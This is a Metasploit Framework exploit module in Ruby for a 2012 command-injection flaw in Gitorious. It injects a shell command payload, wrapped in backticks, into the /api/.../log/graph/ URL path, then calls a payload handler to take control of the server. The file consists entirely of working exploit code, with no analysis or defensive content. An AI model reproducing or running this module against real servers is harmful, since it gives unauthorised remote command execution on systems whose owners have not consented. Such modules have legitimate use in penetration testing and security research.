# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Gitorious Arbitrary Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an arbitrary command execution vulnerability in the
                    in gitorious. Unvalidated input is send to the shell allowing command execution.
            },
            &#039;Author&#039;         => [ &#039;joernchen <joernchen[at]phenoelit.de>&#039; ], #Phenoelit
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://gitorious.org/gitorious/mainline/commit/647aed91a4dc72e88a27476948dfbacd5d0bf7ce&#039; ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x60",
                    &#039;DisableNops&#039; => true,
                    &#039;Space&#039;       => 31337,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                        }
                },
            &#039;Platform&#039;       => [ &#039;unix&#039;, &#039;linux&#039; ],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Jan 19 2012&#039;
            ))
 
            register_options(
                [
                    OptString.new(&#039;URI&#039;, [true, "Path to project and repository", "/project/repo"]),
                ], self.class)
    end
 
    def exploit
        # Make sure the URI begins with a slash
        uri = datastore[&#039;URI&#039;]
        if uri[0,1] != &#039;/&#039;
            uri = &#039;/&#039; + uri
        end
 
        # Make sure the URI ends without a slash, because it&#039;s already part of the URI
        if uri[-1, 1] == &#039;/&#039;
            uri = uri[0, uri.length-1]
        end
 
        command = Rex::Text.uri_encode(payload.raw, &#039;hex-all&#039;)
        command.gsub!("%20","%2520")
        res = send_request_cgi({
            &#039;uri&#039;     => "/api"+ uri + "/log/graph/%60#{command}%60",
            &#039;method&#039;  => &#039;GET&#039;,
            &#039;headers&#039; =>
            {
                &#039;Connection&#039; => &#039;Close&#039;,
            }
        }) #default timeout, we don&#039;t care about the response
 
        if (res)
            print_status("The server returned: #{res.code} #{res.message}")
        end
 
        handler
    end
 
end



